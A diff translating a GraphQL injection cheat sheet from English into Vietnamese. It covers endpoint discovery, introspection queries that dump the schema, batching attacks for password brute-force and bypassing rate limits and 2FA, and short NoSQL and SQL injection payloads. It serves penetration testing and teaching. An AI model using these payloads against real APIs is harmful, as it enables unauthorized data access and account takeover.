@@ -1,58 +1,58 @@
 # GraphQL Injection
 
-> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type
+> GraphQL là một ngôn ngữ truy vấn dành cho API và một runtime để thực thi các truy vấn đó với dữ liệu hiện có. Một dịch vụ GraphQL được tạo ra bằng cách định nghĩa các type và field trên các type đó, sau đó cung cấp các hàm cho mỗi field trên mỗi type
 
-## Summary
+## Tóm tắt
 
-- [Tools](#tools)
-- [Enumeration](#enumeration)
-    - [Common GraphQL Endpoints](#common-graphql-endpoints)
-    - [Identify An Injection Point](#identify-an-injection-point)
-    - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)
-    - [Enumerate Database Schema via Suggestions](#enumerate-database-schema-via-suggestions)
-    - [Enumerate Types Definition](#enumerate-types-definition)
-    - [Enumerating Paths to a Target Type](#enumerating-paths-to-a-target-type)
-- [Methodology](#methodology)
+- [Công cụ](#tools)
+- [Liệt kê thông tin (Enumeration)](#enumeration)
+    - [Các Endpoint GraphQL Phổ Biến](#common-graphql-endpoints)
+    - [Xác Định Điểm Chèn (Injection Point)](#identify-an-injection-point)
+    - [Liệt Kê Schema Cơ Sở Dữ Liệu qua Introspection](#enumerate-database-schema-via-introspection)
+    - [Liệt Kê Schema Cơ Sở Dữ Liệu qua Gợi Ý (Suggestions)](#enumerate-database-schema-via-suggestions)
+    - [Liệt Kê Định Nghĩa Các Type](#enumerate-types-definition)
+    - [Liệt Kê Các Đường Dẫn Đến Một Type Mục Tiêu](#enumerating-paths-to-a-target-type)
+- [Phương pháp](#methodology)
     - [Queries](#queries)
-        - [Basic Query](#basic-query)
-        - [Query with Arguments](#query-with-arguments)
+        - [Query Cơ Bản](#basic-query)
+        - [Query Với Tham Số](#query-with-arguments)
         - [Nested Queries](#nested-queries)
     - [Mutations](#mutations)
-    - [GraphQL Batching Attacks](#graphql-batching-attacks)
-        - [JSON List Based Batching](#json-list-based-batching)
-        - [Query Name Based Batching](#query-name-based-batching)
+    - [Tấn Công GraphQL Batching](#graphql-batching-attacks)
+        - [Batching Dựa Trên JSON List](#json-list-based-batching)
+        - [Batching Dựa Trên Tên Query](#query-name-based-batching)
 - [Injections](#injections)
     - [NOSQL Injection](#nosql-injection)
     - [SQL Injection](#sql-injection)
 - [Labs](#labs)
-- [References](#references)
+- [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Scripting engine to interact with a graphql endpoint for pentesting purposes
-- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL Security Research Material
-- [doyensec/inql](https://github.com/doyensec/inql) - A Burp Extension for GraphQL Security Testing
-- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - parses GraphQL introspection schema and generates possible queries
-- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Lists the different ways of reaching a given type in a GraphQL schema
-- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - An extensive IDE for exploring GraphQL API's
-- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Obtain GraphQL API schema despite disabled introspection
-- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - A GraphQL password brute-force and fuzzing utility
-- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations
-- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Security Auditor Utility for GraphQL APIs
-- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server Engine Fingerprinting utility
-- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph
-- [Insomnia](https://insomnia.rest/) - Cross-platform HTTP and GraphQL Client
+- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Công cụ scripting để tương tác với một endpoint graphql cho mục đích pentest
+- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - Tài liệu nghiên cứu bảo mật GraphQL
+- [doyensec/inql](https://github.com/doyensec/inql) - Một Burp Extension dành cho kiểm thử bảo mật GraphQL
+- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - phân tích schema introspection của GraphQL và tạo ra các query có thể có
+- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Liệt kê các cách khác nhau để tiếp cận một type cho trước trong một schema GraphQL
+- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - Một IDE toàn diện để khám phá các API GraphQL
+- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Lấy schema API GraphQL ngay cả khi introspection đã bị vô hiệu hóa
+- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - Một tiện ích brute-force mật khẩu và fuzzing cho GraphQL
+- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - Framework mối đe dọa GraphQL được các chuyên gia bảo mật sử dụng để nghiên cứu các lỗ hổng bảo mật trong các triển khai GraphQL
+- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Tiện ích kiểm toán bảo mật dành cho API GraphQL
+- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - Tiện ích fingerprint GraphQL Server Engine
+- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Biểu diễn bất kỳ API GraphQL nào thành một đồ thị tương tác
+- [Insomnia](https://insomnia.rest/) - Client HTTP và GraphQL đa nền tảng
 
-## Enumeration
+## Liệt kê thông tin (Enumeration)
 
-### Common GraphQL Endpoints
+### Các Endpoint GraphQL Phổ Biến
 
-GraphQL endpoints are often exposed at predictable paths, most commonly:
+Các endpoint GraphQL thường được đặt ở những đường dẫn dễ đoán, phổ biến nhất là:
 
 - `/graphql`
-- `/graphiql` (interactive IDE)
+- `/graphiql` (IDE tương tác)
 
-You should always probe for both API and developer/debug interfaces.
+Bạn nên luôn dò tìm cả các giao diện API lẫn giao diện dành cho nhà phát triển/debug.
 
 ```ps1
 /v1/explorer
@@ -65,13 +65,13 @@ You should always probe for both API and developer/debug interfaces.
 /graphiql.php
 ```
 
-For an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).
+Để có một wordlist mở rộng hơn, xem [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).
 
-### Identify An Injection Point
+### Xác Định Điểm Chèn (Injection Point)
 
-> A server MUST accept POST requests, and MAY accept other HTTP methods, such as GET. - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)
+> Một server BẮT BUỘC phải chấp nhận các request POST, và CÓ THỂ chấp nhận các phương thức HTTP khác, chẳng hạn như GET. - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)
 
-- GET endpoint
+- Endpoint GET
 
     ```js
     GET /graphql?query={yourQueryHere}
@@ -80,7 +80,7 @@ For an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://gith
     GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D
     ```
 
-- POST endpoint
+- Endpoint POST
 
     ```js
     POST /graphql/v1 HTTP/1.1
@@ -92,7 +92,7 @@ For an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://gith
     }
     ```
 
-Check if errors are visible.
+Kiểm tra xem các lỗi có hiển thị hay không.
 
 ```javascript
 ?query={__schema}
@@ -100,13 +100,13 @@ Check if errors are visible.
 ?query={thisdefinitelydoesnotexist}
 ```
 
-### Enumerate Database Schema via Introspection
+### Liệt Kê Schema Cơ Sở Dữ Liệu qua Introspection
 
-The GraphQL specification includes special fields, such as `__schema` and `__type`, that allow clients to ask the server what types exist, what fields they expose, and how everything connects together.
+Đặc tả GraphQL bao gồm các field đặc biệt, chẳng hạn như `__schema` và `__type`, cho phép client hỏi server những type nào tồn tại, chúng expose những field nào, và mọi thứ kết nối với nhau như thế nào.
 
-An introspection query is simply a request that leverages these special fields to retrieve that structural information. This is what allows interactive environments like GraphiQL or GraphQL Playground to provide auto-completion, inline documentation, and query validation. When a developer types a query, the tool is not guessing, it has already asked the server what is valid and what is not.
+Một introspection query đơn giản là một request tận dụng các field đặc biệt này để lấy được thông tin cấu trúc đó. Đây là điều cho phép các môi trường tương tác như GraphiQL hoặc GraphQL Playground cung cấp tính năng tự động hoàn thành (auto-completion), tài liệu nội tuyến (inline documentation), và kiểm tra hợp lệ query. Khi một nhà phát triển gõ một query, công cụ không phải đang đoán, nó đã hỏi server trước đó rằng cái gì hợp lệ và cái gì không.
 
-A minimal example looks like this:
+Một ví dụ tối giản trông như thế này:
 
 ```js
 {
@@ -114,13 +114,13 @@ A minimal example looks like this:
 }
 ```
 
-URL encoded query to dump the database schema.
+Query đã được URL encode để dump schema cơ sở dữ liệu.
 
 ```js
 fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
 ```
 
-URL decoded query to dump the database schema.
+Query đã được URL decode để dump schema cơ sở dữ liệu.
 
 ```rs
 fragment FullType on __Type {
@@ -219,7 +219,7 @@ query IntrospectionQuery {
 }
 ```
 
-Single line queries to dump the database schema without fragments.
+Các query một dòng để dump schema cơ sở dữ liệu mà không cần fragment.
 
 ```rs
 __schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
@@ -229,9 +229,9 @@ __schema{queryType{name},mutationType{name},types{kind,name,description,fields(i
 {__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 ```
 
-### Enumerate Database Schema via Suggestions
+### Liệt Kê Schema Cơ Sở Dữ Liệu qua Gợi Ý (Suggestions)
 
-When you use an unknown keyword, the GraphQL backend will respond with a suggestion related to its schema.
+Khi bạn sử dụng một từ khóa không xác định, backend GraphQL sẽ phản hồi bằng một gợi ý liên quan đến schema của nó.
 
 ```json
 {
@@ -239,23 +239,23 @@ When you use an unknown keyword, the GraphQL backend will respond with a suggest
 }
 ```
 
-You can also try to bruteforce known keywords, field and type names using wordlists such as [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) when the schema of a GraphQL API is not accessible.
+Bạn cũng có thể thử bruteforce các từ khóa, field và tên type đã biết bằng cách sử dụng các wordlist như [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) khi schema của một API GraphQL không thể truy cập được.
 
-### Enumerate Types Definition
+### Liệt Kê Định Nghĩa Các Type
 
-Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type
+Liệt kê định nghĩa của các type thú vị bằng cách sử dụng query GraphQL sau đây, thay thế "User" bằng type đã chọn
 
 ```javascript
 {__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
 ```
 
-### Enumerating Paths to a Target Type
+### Liệt Kê Các Đường Dẫn Đến Một Type Mục Tiêu
 
-When working with a GraphQL schema, especially after running an introspection query, it is not always obvious how a specific type can be accessed through queries. A given object (like `User`, `Admin`, or `Payment`) may be reachable through multiple entry points and nested relationships.
+Khi làm việc với một schema GraphQL, đặc biệt là sau khi chạy một introspection query, không phải lúc nào cũng rõ ràng làm thế nào một type cụ thể có thể được truy cập thông qua các query. Một object cho trước (như `User`, `Admin`, hoặc `Payment`) có thể được tiếp cận thông qua nhiều điểm vào (entry point) và các mối quan hệ lồng nhau (nested relationships).
 
-- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Tool that lists the different ways of reaching a given type in a GraphQL schema.
+- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Công cụ liệt kê các cách khác nhau để tiếp cận một type cho trước trong một schema GraphQL.
 
-This tool takes the JSON output of an introspection query (which describes the full schema) and analyzes how types are connected. It then outputs different query paths that can be used to reach a specific target type. In practice, this means identifying all the possible ways a client could craft queries that eventually return that object, even if it is deeply nested or indirectly exposed.
+Công cụ này lấy đầu ra JSON của một introspection query (mô tả toàn bộ schema) và phân tích cách các type được kết nối với nhau. Sau đó nó xuất ra các đường dẫn query khác nhau có thể được dùng để tiếp cận một type mục tiêu cụ thể. Trong thực tế, điều này có nghĩa là xác định tất cả các cách có thể mà một client có thể tạo ra các query để cuối cùng trả về object đó, ngay cả khi nó lồng sâu hoặc được expose gián tiếp.
 
 ```php
 graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
@@ -277,17 +277,17 @@ Found 27 ways to reach the "Skill" node from the "Query" node:
 - Query (query) -> Query (skills) -> Skill
 ```
 
-## Methodology
+## Phương pháp
 
-GraphQL supports three main operation types: **queries**, **mutations**, and **subscriptions**.
+GraphQL hỗ trợ ba loại thao tác chính: **queries**, **mutations**, và **subscriptions**.
 
 ### Queries
 
-GraphQL queries are used to request specific fields from a schema, and the structure of your query directly mirrors the JSON response you will receive. At its simplest, querying data means selecting a root field (like `user`, `posts`, or `teams`) and then specifying which subfields you want returned. Unlike REST, you never get extra data, everything must be explicitly requested.
+Các query GraphQL được dùng để yêu cầu các field cụ thể từ một schema, và cấu trúc của query của bạn phản ánh trực tiếp cấu trúc JSON response mà bạn sẽ nhận được. Ở dạng đơn giản nhất, việc truy vấn dữ liệu có nghĩa là chọn một field gốc (như `user`, `posts`, hoặc `teams`) rồi chỉ định các subfield nào bạn muốn được trả về. Không giống như REST, bạn không bao giờ nhận được dữ liệu thừa, mọi thứ phải được yêu cầu một cách rõ ràng.
 
-#### Basic Query
+#### Query Cơ Bản
 
-The simplest query uses the shorthand syntax, where the `query` keyword is omitted. You just define the fields you want starting from the root object.
+Query đơn giản nhất sử dụng cú pháp rút gọn, trong đó từ khóa `query` được bỏ qua. Bạn chỉ cần định nghĩa các field bạn muốn bắt đầu từ object gốc.
 
 ```js
 {
@@ -298,7 +298,7 @@ The simplest query uses the shorthand syntax, where the `query` keyword is omitt
 }
 ```
 
-This tells the server to return the `id` and `name` fields from the user object. The response will follow the exact same structure. If needed, the full syntax can be used with the query keyword, but in most cases the shorthand is enough and commonly seen in real-world traffic.
+Điều này yêu cầu server trả về các field `id` và `name` từ object user. Response sẽ tuân theo chính xác cấu trúc tương tự. Nếu cần, cú pháp đầy đủ có thể được sử dụng với từ khóa query, nhưng trong hầu hết các trường hợp, cú pháp rút gọn là đủ và thường thấy trong lưu lượng truy cập thực tế.
 
 ```js
 query {
@@ -311,9 +311,9 @@ query {
 
 ![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)
 
-#### Query with Arguments
+#### Query Với Tham Số
 
-To retrieve specific data, arguments can be passed to fields. These behave like function parameters and are often used for IDs, filters, or search queries.
+Để lấy dữ liệu cụ thể, các tham số có thể được truyền vào các field. Chúng hoạt động giống như các tham số hàm và thường được sử dụng cho ID, bộ lọc, hoặc các query tìm kiếm.
 
 ```js
 {
@@ -324,11 +324,11 @@ To retrieve specific data, arguments can be passed to fields. These behave like 
 }
 ```
 
-This allows precise targeting of objects and is a common entry point for testing access control issues or IDOR-style vulnerabilities.
+Điều này cho phép nhắm mục tiêu chính xác vào các object và là một điểm vào phổ biến để kiểm tra các vấn đề kiểm soát truy cập hoặc các lỗ hổng kiểu IDOR.
 
 #### Nested Queries
 
-GraphQL allows deep traversal of relationships in a single request. Instead of chaining multiple API calls, you can explore linked objects directly.
+GraphQL cho phép duyệt sâu qua các mối quan hệ trong một request duy nhất. Thay vì phải xâu chuỗi nhiều lệnh gọi API, bạn có thể khám phá các object được liên kết trực tiếp.
 
 ```js
 {
@@ -346,8 +346,8 @@ GraphQL allows deep traversal of relationships in a single request. Instead of c
 
 ### Mutations
 
-A mutation is an operation used to change data on the server (create, update, or delete something).
-Mutations work like function, you can use them to interact with the GraphQL endpoint.
+Mutation là một thao tác được dùng để thay đổi dữ liệu trên server (tạo, cập nhật, hoặc xóa một thứ gì đó).
+Mutations hoạt động giống như hàm, bạn có thể sử dụng chúng để tương tác với endpoint GraphQL.
 
 ```javascript
 mutation{
@@ -365,21 +365,21 @@ mutation{
 }
 ```
 
-**Warning**: Mutations usually won't work with GET. [graphql/graphql-over-http, issue #123](https://github.com/graphql/graphql-over-http/issues/123)
+**Cảnh báo**: Mutations thường sẽ không hoạt động với GET. [graphql/graphql-over-http, issue #123](https://github.com/graphql/graphql-over-http/issues/123)
 
-### GraphQL Batching Attacks
+### Tấn Công GraphQL Batching
 
-Common scenario:
+Các kịch bản phổ biến:
 
-- Password Brute-force Amplification Scenario
-- Rate Limit bypass
-- 2FA bypassing
+- Kịch bản khuếch đại brute-force mật khẩu
+- Vượt qua giới hạn tần suất (Rate Limit bypass)
+- Vượt qua 2FA
 
-#### JSON List Based Batching
+#### Batching Dựa Trên JSON List
 
-> Query batching is a feature of GraphQL that allows multiple queries to be sent to the server in a single HTTP request. Instead of sending each query in a separate request, the client can send an array of queries in a single POST request to the GraphQL server. This reduces the number of HTTP requests and can improve the performance of the application.
+> Query batching là một tính năng của GraphQL cho phép gửi nhiều query đến server trong một request HTTP duy nhất. Thay vì gửi mỗi query trong một request riêng biệt, client có thể gửi một mảng các query trong một request POST duy nhất đến server GraphQL. Điều này giảm số lượng request HTTP và có thể cải thiện hiệu suất của ứng dụng.
 
-Query batching works by defining an array of operations in the request body. Each operation can have its own query, variables, and operation name. The server processes each operation in the array and returns an array of responses, one for each query in the batch.
+Query batching hoạt động bằng cách định nghĩa một mảng các thao tác trong body của request. Mỗi thao tác có thể có query, biến (variables), và tên thao tác riêng của nó. Server xử lý từng thao tác trong mảng và trả về một mảng các response, mỗi response tương ứng với một query trong batch.
 
 ```json
 [
@@ -398,7 +398,7 @@ Query batching works by defining an array of operations in the request body. Eac
 ]
 ```
 
-#### Query Name Based Batching
+#### Batching Dựa Trên Tên Query
 
 ```json
 {
@@ -406,7 +406,7 @@ Query batching works by defining an array of operations in the request body. Eac
 }
 ```
 
-Send the same mutation several times using aliases
+Gửi cùng một mutation nhiều lần bằng cách sử dụng alias
 
 ```js
 mutation {
@@ -419,11 +419,11 @@ mutation {
 
 ## Injections
 
-> SQL and NoSQL Injections are still possible since GraphQL is just a layer between the client and the database.
+> SQL và NoSQL Injection vẫn có thể xảy ra vì GraphQL chỉ là một lớp trung gian giữa client và cơ sở dữ liệu.
 
 ### NOSQL Injection
 
-Use `$regex` inside a `search` parameter.
+Sử dụng `$regex` bên trong tham số `search`.
 
 ```js
 {
@@ -438,7 +438,7 @@ Use `$regex` inside a `search` parameter.
 
 ### SQL Injection
 
-Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection
+Gửi một dấu nháy đơn `'` bên trong một tham số GraphQL để kích hoạt SQL injection
 
 ```js
 { 
@@ -450,7 +450,7 @@ Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection
 }
 ```
 
-Simple SQL injection inside a GraphQL field.
+SQL injection đơn giản bên trong một field GraphQL.
 
 ```powershell
 query {
@@ -473,7 +473,7 @@ query {
 - [Root Me - GraphQL - Backend injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
 - [Root Me - GraphQL - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)
 
-## References
+## Tài liệu tham khảo
 
 - [Building a free open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - August 17, 2023](https://web.archive.org/web/20230919211552/https://escape.tech/blog/graphql-security-wordlist/)
 - [Exploiting GraphQL - AssetNote - Shubham Shah - August 29, 2021](https://web.archive.org/web/20210830161635/https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
